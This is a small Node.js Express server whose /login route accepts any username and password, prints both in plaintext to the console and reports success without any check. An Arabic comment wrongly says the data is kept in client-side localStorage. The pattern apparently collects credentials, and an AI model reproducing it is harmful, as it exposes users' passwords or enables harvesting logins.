const express = require('express');
const bodyParser = require('body-parser');
const cors = require('cors');
const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

app.post('/login', (req, res) => {
  const { username, password } = req.body;
  console.log(`Received login request - Username: ${username}, Password: ${password}`);
  
  // تخزين البيانات في localStorage (على المستوى العميل)
  const logData = `Username: ${username}, Password: ${password}\n`;
  res.json({ success: true, message: 'Login data received successfully.' });
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});
